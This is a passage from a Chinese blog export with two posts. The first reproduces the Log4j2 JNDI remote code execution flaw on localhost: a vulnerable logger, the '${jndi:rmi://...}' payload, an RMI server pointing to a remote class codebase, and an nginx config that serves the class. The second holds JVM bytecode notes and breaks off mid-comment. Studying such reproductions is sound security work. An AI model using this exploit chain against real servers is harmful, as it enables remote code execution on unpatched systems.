    <url>/2023/04/29/Log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
    <content><![CDATA[<h1 id="1-本地黑客脚本服务"><a href="#1-本地黑客脚本服务" class="headerlink" title="1. 本地黑客脚本服务"></a>1. 本地黑客脚本服务</h1><h2 id="MyServer-java（应用服务）"><a href="#MyServer-java（应用服务）" class="headerlink" title="MyServer.java（应用服务）"></a>MyServer.java（应用服务）</h2><p>假设当前文件为Controller中的一个普通的日志打印，而通过前端把用户名传入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"><span class="keyword">import</span> org.slf4j.LoggerFactory;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * MyServer</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> He Zhifei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/12/24 22:22</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyServer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">LOGGER</span> <span class="operator">=</span> LoggerFactory.getLogger(MyServer.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 测试rmi服务器在其它工程时，较新的jdk1.8的版本需要设置这两个参数，默认是关闭的，1.8之前的版本不需要设置</span></span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.rmi.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        System.setProperty(<span class="string">&quot;com.sun.jndi.ldap.object.trustURLCodebase&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 假设通过前端表单输入用户名为：$&#123;jndi:rmi://127.0.0.1:8080/look&#125;</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">username</span> <span class="operator">=</span> <span class="string">&quot;$&#123;jndi:rmi://127.0.0.1:8080/look&#125;&quot;</span>;</span><br><span class="line">        LOGGER.info(<span class="string">&quot;用户名：&#123;&#125;&quot;</span>, username);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>应用服务的pom.xml配置</li>
</ul>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>7<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>7<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">log4j2.version</span>&gt;</span>2.14.1<span class="tag">&lt;/<span class="name">log4j2.version</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--        &lt;log4j2.version&gt;2.17.0&lt;/log4j2.version&gt;--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- log4j2依赖 log4j-api、log4j-core --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;log4j2.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;log4j2.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- log4j2和slf4j桥接依赖 https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-slf4j-impl --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-slf4j-impl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;log4j2.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- slf4j依赖 https://mvnrepository.com/artifact/org.slf4j/slf4j-api --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.slf4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>slf4j-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.7.32<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="HackerScript-java（黑客脚本）"><a href="#HackerScript-java（黑客脚本）" class="headerlink" title="HackerScript.java（黑客脚本）"></a>HackerScript.java（黑客脚本）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.TimeUnit;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * HackerScript</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> He Zhifei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/12/24 22:30</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HackerScript</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        run();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;++++++++++++ 齐天大圣到此一游 ++++++++++++&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                TimeUnit.MILLISECONDS.sleep(<span class="number">1000</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="HackerRmiServer-java（调用脚本的本地黑客服务）"><a href="#HackerRmiServer-java（调用脚本的本地黑客服务）" class="headerlink" title="HackerRmiServer.java（调用脚本的本地黑客服务）"></a>HackerRmiServer.java（调用脚本的本地黑客服务）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei.server;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * HackerRmiServer 测试rmi服务与我的服务在同一个工程</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> He Zhifei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/12/24 22:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HackerRmiServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">8080</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">hackerScriptClassName</span> <span class="operator">=</span> HackerScript.class.getName();</span><br><span class="line">        registry.bind(</span><br><span class="line">                <span class="string">&quot;look&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="literal">null</span>, hackerScriptClassName, <span class="literal">null</span>))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后，先启动 HackerRmiServer，再启动 MyServer 看测试效果。</p>
<h1 id="2-远程黑客脚本服务（一般情况）"><a href="#2-远程黑客脚本服务（一般情况）" class="headerlink" title="2. 远程黑客脚本服务（一般情况）"></a>2. 远程黑客脚本服务（一般情况）</h1><p>黑客服务器在远程，也是一般的攻击方式。应用服务、黑客脚本与第1点说的一样，调用脚本的方式有所不同，如下。</p>
<h2 id="HackerRmiServer-java（调用脚本的远程黑客服务）"><a href="#HackerRmiServer-java（调用脚本的远程黑客服务）" class="headerlink" title="HackerRmiServer.java（调用脚本的远程黑客服务）"></a>HackerRmiServer.java（调用脚本的远程黑客服务）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.zhifei.hacker;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * HackerRmiServer 测试rmi服务与我的服务在同不同工程，其中</span></span><br><span class="line"><span class="comment"> * 代码中的 http://127.0.0.1:9090/ 为nginx配置，配置如下：</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> He Zhifei</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@date</span> 2021/12/24 22:24</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HackerRmiServer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">8080</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">hackerScriptClassName</span> <span class="operator">=</span> HackerScript.class.getName();</span><br><span class="line">        registry.bind(</span><br><span class="line">                <span class="string">&quot;look&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(<span class="keyword">new</span> <span class="title class_">Reference</span>(<span class="literal">null</span>, hackerScriptClassName, <span class="string">&quot;http://127.0.0.1:9090/&quot;</span>))</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>nginx配置</li>
</ul>
<p>端口与 <code>com.zhifei.hacker.HackerRmiServer</code> 中配置的地址对应。同时，把编译后的 <code>HackerScript.class</code> 放到 <code>hacker-script</code> 目录下，注意需要把这个类的包路径也带上，也就是放到 <code>hacker-script\com\zhifei\hacker\</code> 目录下。最后，先启动 HackerRmiServer，再启动 MyServer 看测试效果</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 9090;</span><br><span class="line">    server_name localhost;</span><br><span class="line">    </span><br><span class="line">    location / &#123;</span><br><span class="line">        root	hacker-script;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h1><p><a href="https://github.com/he-zhifei/log4j2-bug">he-zhifei&#x2F;log4j2-bug: 演示log4j2的远程代码执行漏洞。 (github.com)</a></p>
]]></content>
      <categories>
        <category>Log4j2</category>
      </categories>
      <tags>
        <tag>Log4j2漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>JVM介绍与优化</title>
    <url>/2021/12/12/JVM%E4%BB%8B%E7%BB%8D%E4%B8%8E%E4%BC%98%E5%8C%96/</url>
    <content><![CDATA[<h1 id="1-字节码"><a href="#1-字节码" class="headerlink" title="1. 字节码"></a>1. 字节码</h1><p>关于JDK的命名：在官方正式文档中，开发版本号在JDK 10及之后取消1.x的命名方式，公开版本号在JDK 5及之后取消了这种命名方式，即：JDK 1.0 ~ JDK 1.4、JDK 5 ~ JDK X。</p>
<p>有Class对象的类型：类、接口、数组、枚举、注解、基本数据类型、void。</p>
<p>JVM中的数据类型：8种基本数据类型、对象引用（reference类型）和returnAddress类型。</p>
<p>为什么不把基本数据类型放入堆中：堆空间大，但运算速度慢；复杂数据类型在创建时无法确定其大小，为了不影响栈的效率，放入堆中；基本数据类型比较稳定，并且占用空间小，放入运算速度快的栈中，能提高效率。</p>
<p>Java没有指针，参数传递是值传递。</p>
<h2 id="1-1-前端编译器"><a href="#1-1-前端编译器" class="headerlink" title="1.1 前端编译器"></a>1.1 前端编译器</h2><p>负责把java文件编译成class文件，不涉及编译优化的问题，优化细节交给JIT负责。比如：</p>
<ul>
<li>javac（全量编译，与之相反的工具javap），编译步骤：词法解析、语法解析、语义解析、生成字节码。</li>
<li>ECJ(Eclipse Complier for Java，增量编译)</li>
<li>AJC(IDEA的AspectJ编译器，IDEA默认使用javac)。</li>
</ul>
<h2 id="1-2-Class文件结构"><a href="#1-2-Class文件结构" class="headerlink" title="1.2 Class文件结构"></a>1.2 Class文件结构</h2><p>Class文件是一组以8个字节为基础单位的二进制流，各个数据项目严格按照顺序紧凑地排列在文件之中，中间没有添加任何分隔符，这使得整个Class文件中存储的内容几乎全部是程序运行的必要数据，没有空隙存在。当遇到需要占用8个字节以上空间的数据项时，则会按照高位在前的方式分割成若干个8个字节进行存储。</p>
<p>1）Class文件结构的数据类型：</p>
<ul>
<li>无符号数：属于基本的数据类型，包含1、2、4、8个字节的无符号数，用来描述数字、索引引用、数量值或者按照UTF-8编码构成字符串值。</li>
<li>表：由多个无符号数或其它表作为数据项构成的复合数据类型，它的命名习惯地以“_info”结尾。用来描述有层次关系的复合结构的数据，整个Class文件本质上也可以视作是一张表。</li>
</ul>
<p>2）Class文件结构：</p>
<ul>
<li><p>魔数（Magic Number）：前4个字节（固定为0xCAFEBABE），决定Class文件是否能被虚拟机接受。</p>
</li>
<li><p>Class文件的版本：魔数之后的4个字节，第5和第6个字节是次版本号（Minor Version），第7和第8个字节是主版本号（Major Version）。</p>
</li>
<li><p>常量池：Class文件版本之后为常量池入口，常量池中常量的数量是不固定的，是占用Class文件空间最大的数据项目。前2个子节表示常量池容量计数值（constant_pool_count），它是某些指向常量池数据的索引值。常量池的容量计数是从1开始的（0表示不引用任何一个常量池项目），其它集合类型的容量计数一般从0开始。常量池主要存放两大类常量：</p>
<ul>
<li>字面量（Literal）：文本字符串、被声明为final的常量值等。</li>
<li>符号引用（Symbolic References），主要包括：<ul>
<li>被模块导出或者开放的包（Package）</li>
<li>类和接口的全限定名（Fully Qualified Name）</li>
<li>字段的名称和描述符（Descriptor）</li>
<li>方法的名称和描述符</li>
<li>方法句柄和方法类型（Method Handle、Method Type、Invoke Dynamic）</li>
<li>动态调用点和动态常量（Dynamically-Computed Call Site、Dynamically-Computed Constant）</li>
</ul>
</li>
</ul>
<p>作用：存放编译时期生成的字面量和符号引用，经过类加载的解析之后，这部分内容进入运行时常量池。</p>
<p>虚拟机在加载Class文件时才进行动态连接。也就是说，在Class文件中不会保存各个方法、字段最终在内存中的布局信息，这些字段、方法的符号引用不经过虚拟机在运行期转换的话，无法得到真正的内存入口地址，也就无法直接被虚拟机使用。当虚拟机进行类加载时，将会从常量池获得对应的符号引用，再在类创建时或运行时解析、翻译到具体的内存地址之中。</p>
</li>
<li><p>访问标志：常量池之后的2个子节为访问标志（access_flags），用来识别类或接口的访问信息，包括：是类还是接口；是否是public类型；是否是abstract类型；如果是类，是否被声明为final；等等。</p>
</li>
<li><p>类索引、父类索引与接口索引集合：</p>
<ul>
<li>类索引（this_class）：2个子节，用来确定这个类的全限定名</li>
<li>父类索引（super_class）：2个子节，用来确定这个类的父类的全限定名。除了java.lang.Object之外，所有Java类的父类索引都不为0。</li>
<li>接口索引集合 （interfaces）是一组2个子节数据的集合。用来描述这个类实现的所有接口，被实现的接口按implements关键字（如果Class文件表示的是接口，则是extends关键字）后的接口顺序从左到右排列在接口索引集合中。</li>
</ul>
<p>作用：这三项数据用来确定类型的继承关系。</p>
</li>
<li><p>字段表集合：字段表（field_info）用来描述接口或类声明的变量（类变量、实例变量）。包括的修饰符有：</p>
<ul>
<li><p>字段的作用域（public、private、protected修饰符）</p>
</li>
<li><p>是实例变量还是类变量（static修饰符）</p>
</li>
<li><p>可变性（final）</p>
</li>
<li><p>并发可见性（volatile修饰符，是否强制从主内存读写）</p>
</li>
<li><p>可否被序列化（transient修饰符）</p>
</li>
<li><p>字段数据类型（基本类型、对象、数组）</p>
</li>
<li><p>字段名称。</p>
</li>
</ul>
<p>各个修饰符都是布尔值，要么有某个修饰符，要么没有，使用标志位来表示。而字段的名字、字段的数据类型，长度无法固定，引用常量池的常量来描述。</p>
</li>
<li><p>方法表集合：对方法的描述与对字段的描述基本相同，方法表的结构与字段表一样，依次包括访问标志（access_flags）、名称索引（name_index）、描述符索引（descriptor_index）、属性表集合（attributes）。这些数据项目的含义也与字段表中的类似，仅在访问标志和属性表集合的可选项中有所区别。</p>
<ul>
<li>访问标志的区别：因为volatile关键字和transient关键字不能修饰方法，所以方法表的访问标志中没有了ACC_VOLATILE标志和ACC_TRANSIENT标志。与之相对，synchronized、native、strictfp和abstract关键字可以修饰方法，方法表的访问标志中也相应地增加了ACC_SYNCHRONIZED、 ACC_NATIVE、ACC_STRICTFP和ACC_ABSTRACT标志。</li>
</ul>
</li>
<li><p>属性表集合：Class文件、字段表、方法表都可以携带自己的属性表（attribute_info）集合，以描述某些场景专有的信息。</p>
</li>
</ul>
<h2 id="1-3-符号引用和直接引用"><a href="#1-3-符号引用和直接引用" class="headerlink" title="1.3 符号引用和直接引用"></a>1.3 符号引用和直接引用</h2><ul>
<li><p>符号引用：符号引用以一组符号来描述所引用的目标，符号可以是任何形式的字面量，只要使用时能无歧义地定位到目标即可。符号引用与虚拟机实现的内存布局无关，引用的目标并不一定是已经加载到虚拟机内存当中的内容。各种虚拟机实现的内存布局可以各不相同，但是它们能接受的符号引用必须都是一致的，因为符号引用的字面量形式明确定义在《Java虚拟机规范》的Class文件格式中。</p>
</li>
<li><p>直接引用：直接引用是可以直接指向目标的指针、相对偏移量或者是一个能间接定位到目标的句柄。直接引用是和虚拟机实现的内存布局直接相关的，同一个符号引用在不同虚拟机实例上翻译出来的直接引用一般不会相同。如果有了直接引用，那引用的目标必定已经在虚拟机的内存中存在。</p>
</li>
</ul>
<h2 id="1-4-字节码指令"><a href="#1-4-字节码指令" class="headerlink" title="1.4 字节码指令"></a>1.4 字节码指令</h2><p>Java虚拟机的指令由一个字节长度的、代表着某种特定操作含义的数字（称为操作码，Opcode） 以及跟随其后的零至多个代表此操作所需的参数（称为操作数，Operand）构成。其中，大多数指令都不包含操作数，只有一个操作码，指令参数都存放在操作数栈中。</p>
<p>指令大致分为九类：加载和存储指令、运算指令、类型转换指令、对象创建与访问指令、操作数栈管理指令、控制转移指令、方法调用和返回指令、异常处理指令、同步指令。如下是与方法调用相关的指令：</p>
<ul>
<li>invokevirtual：调用实例方法</li>
<li>invokeinterface：调用接口方法</li>
<li>invokespecial：调用需要特殊处理的实例方法，包括构造器、私有方法和父类方法。这些方法都是静态类型绑定的，不会在调用时进行动态派发。</li>
<li>invokestatic：调用类中的类方法（静态方法），这是静态绑定的。</li>
<li>invokedynamic：调用动态绑定的方法，JDK 7后加入的指令。用于在运行时动态解析出调用点限定符所引用的方法，并执行该方法。前面4条调用指令的分派逻辑都固化在java虚拟机内部，而invokedynamic指令的分派逻辑是由用户所设定的引导方法决定的。</li>
</ul>
<p>IDEA中查看字节码指令插件：jclasslib bytecode viewer（先build&#x3D;&gt; recompile，然后view &#x3D;&gt; show bytecode）。</p>
<h3 id="1）案例一"><a href="#1）案例一" class="headerlink" title="1）案例一"></a>1）案例一</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 字节码：</span></span><br><span class="line"><span class="comment">     *  0 bipush 10     操作数栈顶插入10</span></span><br><span class="line"><span class="comment">     *  2 istore_1      拿出操作数栈顶元素，插入局部变量表下标为1的位置</span></span><br><span class="line"><span class="comment">     *  3 iinc 1 by 1   局部变量表下标1的位置自增1</span></span><br><span class="line"><span class="comment">     *  6 getstatic #2 &lt;java/lang/System.out : Ljava/io/PrintStream;&gt;</span></span><br><span class="line"><span class="comment">     *  9 iload_1       把局部变量表下标1的位置元素插入到操作数栈顶部</span></span><br><span class="line"><span class="comment">     * 10 invokevirtual #3 &lt;java/io/PrintStream.println : (I)V&gt;</span></span><br><span class="line"><span class="comment">     * 13 return</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line"><span class="comment">//        i++;</span></span><br><span class="line">        ++i;    <span class="comment">// 这里的两者字节码完全相同</span></span><br><span class="line">        System.out.println(i);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test2</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        i = i++;</span><br><span class="line">        System.out.println(i);  <span class="comment">// 10</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test3</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>;</span><br><span class="line">        i *= i++;</span><br><span class="line">        System.out.println(i);  <span class="comment">// 4</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test4</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        k = k + (k++) + (++k);</span><br><span class="line">        System.out.println(k);  <span class="comment">// 32</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 前两行字节码：</span></span><br><span class="line"><span class="comment">     *  0 bipush 10     操作数栈顶插入10</span></span><br><span class="line"><span class="comment">     *  2 invokestatic #4 &lt;java/lang/Integer.valueOf : (I)Ljava/lang/Integer;&gt;  调用Integer.valueOf创建对象</span></span><br><span class="line"><span class="comment">     *  5 astore_1      把对象引用插入到局部变量表下标1位置</span></span><br><span class="line"><span class="comment">     *  6 bipush 10</span></span><br><span class="line"><span class="comment">     *  8 invokestatic #4 &lt;java/lang/Integer.valueOf : (I)Ljava/lang/Integer;&gt;</span></span><br><span class="line"><span class="comment">     * 11 astore_2</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 结合java.lang.Integer#valueOf(int)在-128~127范围内使用缓存中的对象，因此i1 == i2为true，i3 == i4为false；</span></span><br><span class="line"><span class="comment">     * 同理java.lang.Boolean#valueOf(boolean)内部有两个常量，因此b1 == b2为true；</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 包装类对象的缓存：</span></span><br><span class="line"><span class="comment">     * Byte/Short/Integer/Long      -128~127</span></span><br><span class="line"><span class="comment">     * Float/Double                 没有缓存</span></span><br><span class="line"><span class="comment">     * Character                    0-127</span></span><br><span class="line"><span class="comment">     * Boolean                      true、false</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test5</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">i1</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">10</span>;</span><br><span class="line">        System.out.println(i1 == i2);   <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Integer</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">        <span class="type">Integer</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">128</span>;</span><br><span class="line">        System.out.println(i3 == i4);   <span class="comment">// false</span></span><br><span class="line"></span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">b1</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">b2</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        System.out.println(b1 == b2);   <span class="comment">// true</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 通过字面量的方式创建的String对象都放在字符串常量池中；</span></span><br><span class="line"><span class="comment">     * JDK 6字符串常量池放在方法区（永久代）；</span></span><br><span class="line"><span class="comment">     * JDK 7及之后字符串常量池放在堆空间；</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test6</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">str1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;aaa&quot;</span>) + <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;bbb&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 字符串常量池中若存在此字符串，返回该对象；不存在则添加到池中，并返回该对象。</span></span><br><span class="line"><span class="comment">//        str1.intern();</span></span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">str2</span> <span class="operator">=</span> <span class="string">&quot;aaabbb&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 不调用intern时-false。调用intern时，java6及之前-false；之后-true。</span></span><br><span class="line">        System.out.println(str1 == str2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *  0 sipush 128    操作数栈顶插入128</span></span><br><span class="line"><span class="comment">     *  3 invokestatic #4 